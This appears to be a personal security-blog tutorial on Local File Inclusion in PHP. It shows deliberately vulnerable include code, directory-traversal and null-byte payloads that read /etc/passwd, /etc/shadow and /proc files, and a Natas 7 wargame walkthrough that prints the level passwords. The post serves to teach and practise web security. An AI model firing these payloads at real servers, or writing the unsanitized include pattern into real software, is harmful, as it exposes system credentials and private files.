<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->

	<title>Chejarla Santosh Kumar</title>
	<link href="my logo.jpg" rel="icon" type="image/jpg" />
	<!-- Google font -->
	<link href="https://fonts.googleapis.com/css?family=Montserrat:400,700%7CVarela+Round" rel="stylesheet">

	<!-- Bootstrap -->
	<link type="text/css" rel="stylesheet" href="css/bootstrap.min.css" />

	<!-- Owl Carousel -->
	<link type="text/css" rel="stylesheet" href="css/owl.carousel.css" />
	<link type="text/css" rel="stylesheet" href="css/owl.theme.default.css" />

	<!-- Magnific Popup -->
	<link type="text/css" rel="stylesheet" href="css/magnific-popup.css" />

	<!-- Font Awesome Icon -->
	<link rel="stylesheet" href="css/font-awesome.min.css">

	<!-- Custom stlylesheet -->
	<link type="text/css" rel="stylesheet" href="css/style.css" />

	<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
		<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
		<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->
</head>

<body>

	<!-- Header -->
	<header>

		<!-- Nav -->
		<nav id="nav" class="navbar">
			<div class="container">

				<div class="navbar-header">
					<!-- Logo -->
					<div class="navbar-brand">
						<a href="index.html">
							<img class="logo" src="img/my logo.jpg" alt="logo">
						</a>
					</div>
					<!-- /Logo -->

					<!-- Collapse nav button -->
					<div class="nav-collapse">
						<span></span>
					</div>
					<!-- /Collapse nav button -->
				</div>

				<!--  Main navigation  -->
				<ul class="main-nav nav navbar-nav navbar-right">
					<li><a href="index.html">Home</a></li>
					<li><a href="web-intro.html">Web exploitation</a></li>
					<li><a href="recon.html">Recon</a></li>
					<li><a href="android.html">Android exploitation</a></li>
					<li><a href="random.html">Random stuff</a></li>
					<li><a href="CV/resume.html">Resume</a></li>
					<li><a href="index.html#contact">Contact</a></li>
				</ul>
				<!-- /Main navigation -->

			</div>
		</nav>
		<!-- /Nav -->

		<!-- header wrapper -->
		<div class="header-wrapper sm-padding bg-grey">
                <div class="container">
                    <h2>Web exploitation</h2>
                    <ul class="breadcrumb">
                        <li class="breadcrumb-item"><a href="index.html">Home</a></li>
                        <li class="breadcrumb-item"><a href="web-intro.html">web</a></li>
                        <li class="breadcrumb-item"><a href="web-localfile.html">Local file inclusion</a></li>
                    </ul>
                </div>
            </div>
		<!-- /header wrapper -->

	</header>
	<!-- /Header -->

	<!-- Blog -->
	<div id="blog" class="section md-padding">

		<!-- Container -->
		<div class="container">

			<!-- Row -->
			<div class="row">

				<!-- Main -->
				<main id="main" class="col-md-9">
					<div class="blog">
						<div class="blog-img">
							<img class="img-responsive" src="./img/websecurity.jpg" alt="">
						</div>
						<div class="blog-content">
							<ul class="blog-meta">
								<li><i class="fa fa-user"></i>CHS</li>
								<li><i class="fa fa-clock-o"></i>29th Jul 2018</li>
								<!--<li><i class="fa fa-comments"></i>57</li>-->
                            </ul>
                           <h1 id="localfileinclusion">Local File Inclusion</h1>

                            <h3 id="owasp">OWASP :</h3>
                            
                            <p>Local File Inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected. Although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP and others.</p>
                            
                            <h3 id="localfileinclusioninphp">Local file inclusion in PHP:</h3>
                            
                            <p>Consider an example as follows where we can apply this attack.
                            http://victim_site/abc.php?file=userinput.txt
                            The value of “file” parameter is taken into the following PHP code, and the file is included:</p>
                            
                            <pre><code class="php language-php">&lt;?php
$file = $_GET['file'];
if(isset($file))
{
    include("pages/$file");
}
?&gt;</code></pre>
                            
                            <p>An attacker may give malicious input for the "file" parameter which may give unauthorized files in that directory, he can also change the directories by using characters like "../".He can access the user credentials by giving input as "../../../../etc/passwd".In some cases where the file extension is added by default, we can avoid it by adding null byte terminator " %00".Any character after this special character will be ignored.</p>
                            
                            <p>Suppose that the input given is taken by the following code and the default extension being set is “.php”.</p>
                            
                            <pre><code class="php language-php">&lt;?php
“include/”.include($_GET[‘testfile’].”.php”);
?&gt;</code></pre>
                            
                            <p>by giving file=../../../../etc/passwd%00 we can access the file by passing the ".php" extension.</p>
                            
                            <p>An attacker can also download files by changing the file names. For example
                            <br>URL : example/?download=broucher.pdf
                            </br>The attacker may change the broucher.pdf to any other file such as passwords.txt,users.txt etc,</p>
                            
                            <h2 id="impact">Impact</h2>
                            
                            <p>A successful LFI may result in compromise of the system ,data leakage etc.The attacker can read,write,download files and can also run arbitary codes with privileges of web server</p>
                            
                            <h2 id="exploreityourself">Explore it yourself</h2>
                            
                            <p>Make a php file with the code given above and explore different possibilities of the vulnerability.</p>
                            
                            <h3 id="somepayloads">Somepayloads :</h3>
                            
                            <ul>
                            <li>../../../../etc/passwd/etc/issue</li>
                            
                            <li>../../../../etc/passwd</li>
                            
                            <li>../../../../etc/passwd/etc/shadow</li>
                            
                            <li>../../../../etc/passwd/etc/group</li>
                            
                            <li>../../../../etc/passwd/etc/hosts</li>
                            
                            <li>../../../../etc/passwd/etc/motd</li>
                            
                            <li>../../../../etc/passwd/etc/mysql/my.cnf</li>
                            
                            <li>../../../../proc/self/environ</li>
                            
                            <li>../../../../proc/version</li>
                            
                            <li>../../../../proc/cmdline</li>
                            
                            <li>../../../../proc/sched_debug</li>
                            
                            <li>../../../../proc/mounts</li>
                            
                            <li>../../../../proc/net/arp</li>
                            
                            <li>../../../../proc/net/route</li>
                            
                            <li>../../../../proc/net/tcp</li>
                            
                            <li>../../../../proc/net/udp</li>
                            </ul>
                            
                            <h1 id="letstryachallenge">Let's try a challenge</h1>
                            
                            <p>NATAS 7 :</p>
                            
                            <ul>
                            <li>USERNAME : natas7</li>
                            
                            <li>PASSWORD : 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
                            <img src="img/wiki/lfi/natas7.1.png" alt="natas7" width="1000em" /></li>
                            </ul>
                            
                            <p>The site is very simple only with two buttons, but once when you click on Home or About the URL changes as follows :</p>
                            
                            <p><img src="img/wiki/lfi/natas7.2.png" alt="natas7" /></br>
                              <img src="img/wiki/lfi/natas7.3.png" alt="natas7" /></p>
                            
                            <p>It looks like the PHP file is including the file given as page, when we check the source code we get the hint as <br />
                             hint: password for webuser natas8 is in /etc/natas_webpass/</br></br>
                              <img src="img/wiki/lfi/natas7.4.png" alt="natas7" width="1000em" /></p>
                            
                            <p>So, let's try to include that file in the URL 
                             URL : index.php?page=/etc/natas_webpass/natas8
                            On including this file we get the password for the next level on the screen </br></br>
                            password : DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</br></br>
                            <img src="img/wiki/lfi/natas7.5.png" alt="natas7" width="1000em"/>
                            </br></br>
                            This is a basic example of Local file inclusion vulnerability.</p>

						<!-- blog author -->
						<div class="blog-author">
							<div class="media">
								<div class="media-left">
									<img class="media-object" src="my logo.jpg" height="150em" alt="">
								</div>
								<div class="media-body">
									<div class="media-heading">
										<h3>CHS</h3>
										<div class="author-social">
											<a href="https://www.facebook.com/ch.santoshkumar211"><i class="fa fa-facebook"></i></a>
											<a href="https://twitter.com/ch_santoshkumar"><i class="fa fa-twitter"></i></a>
											<a href="https://www.linkedin.com/in/santosh-kumar-chejarla-ba399614b/"><i class="fa fa-linkedin"></i></a>
											<a href="https://github.com/chsantoshkumar211"><i class="fa fa-github"></i></a>
										</div>
									</div>
									<p>With the info in the post you can try some CTF's where you can explore different aspects of this vulnerability.This is a First shot I'll try to improve the post in the future</p>
								</div>
							</div>
						</div>
						<!-- /blog author -->

					</div>
				</main>
				<!-- /Main -->


				<!-- Aside -->
				<aside id="aside" class="col-md-3">

					<!-- Category -->
					<div class="widget">
                            <h3 class="title">Topics</h3>
                            <div class="widget-category">
                                <a href="web-intro.html">Intro</a>
                                <a href="web-fileupload.html">File upload</a>
								<a href="#">Local file inclusion</a>
								<a href="web-sql.html">SQL injections</a>
                                <!--
                                <a href="#">Web Development<span>(74)</span></a>
                                <a href="#">Branding<span>(60)</span></a>
                                <a href="#">Photography<span>(5)</span></a>
                                -->
                            </div>
                        </div>
					<!-- /Category -->

					<!-- Posts sidebar 
					<div class="widget">
						<h3 class="title">Populare Posts</h3>

						<!-- single post 
						<div class="widget-post">
							<a href="#">
								<img src="./img/post1.jpg" alt=""> Blog title goes here
							</a>
							<ul class="blog-meta">
								<li>Oct 18, 2017</li>
							</ul>
						</div>
						<!-- /single post -->

						<!-- single post 
						<div class="widget-post">
							<a href="#">
								<img src="./img/post2.jpg" alt=""> Blog title goes here
							</a>
							<ul class="blog-meta">
								<li>Oct 18, 2017</li>
							</ul>
						</div>
						<!-- /single post 


						<!-- single post 
						<div class="widget-post">
							<a href="#">
								<img src="./img/post3.jpg" alt=""> Blog title goes here
							</a>
							<ul class="blog-meta">
								<li>Oct 18, 2017</li>
							</ul>
						</div>
						<!-- /single post 

					</div>
					<!-- /Posts sidebar -->

					<!-- Tags -
					<div class="widget">
						<h3 class="title">Tags</h3>
						<div class="widget-tags">
							<a href="#">Web</a>
							<a href="#">Design</a>
							<a href="#">Graphic</a>
							<a href="#">Marketing</a>
							<a href="#">Development</a>
							<a href="#">Branding</a>
							<a href="#">Photography</a>
						</div>
					</div>
					<!-- /Tags -->

				</aside>
				<!-- /Aside -->

			</div>
			<!-- /Row -->

		</div>
		<!-- /Container -->

	</div>
	<!-- /Blog -->

	<!-- Footer -->
	<footer id="footer" class="sm-padding bg-dark">

		<!-- Container -->
		<div class="container">

			<!-- Row -->
			<div class="row">

				<div class="col-md-12">

					<!-- footer logo -->
					<div class="footer-logo">
						<a href="index.html"><img src="img/my logo.jpg" alt="logo"></a>
					</div>
					<!-- /footer logo -->

					<!-- footer follow -->
					<ul class="footer-follow">
						<li><a href="https://www.facebook.com/ch.santoshkumar211"><i class="fa fa-facebook"></i></a></li>
						<li><a href="https://twitter.com/ch_santoshkumar"><i class="fa fa-twitter"></i></a></li>
						<li><a href="https://www.linkedin.com/in/santosh-kumar-chejarla-ba399614b/"><i class="fa fa-linkedin"></i></a></li>
						<li><a href="https://github.com/chsantoshkumar211"><i class="fa fa-github"></i></a></li>
					</ul>
					<!-- /footer follow -->

					<!-- footer copyright -->
					<div class="footer-copyright">
						<p>Copyright © 2017. All Rights Reserved. Designed by <a href="https://colorlib.com" target="_blank">Colorlib</a></p>
					</div>
					<!-- /footer copyright -->

				</div>

			</div>
			<!-- /Row -->

		</div>
		<!-- /Container -->

	</footer>
	<!-- /Footer -->

	<!-- Back to top -->
	<div id="back-to-top"></div>
	<!-- /Back to top -->

	<!-- Preloader -->
	<div id="preloader">
		<div class="preloader">
			<span></span>
			<span></span>
			<span></span>
			<span></span>
		</div>
	</div>
	<!-- /Preloader -->

	<!-- jQuery Plugins -->
	<script type="text/javascript" src="js/jquery.min.js"></script>
	<script type="text/javascript" src="js/bootstrap.min.js"></script>
	<script type="text/javascript" src="js/owl.carousel.min.js"></script>
	<script type="text/javascript" src="js/jquery.magnific-popup.js"></script>
	<script type="text/javascript" src="js/main.js"></script>

</body>

</html>
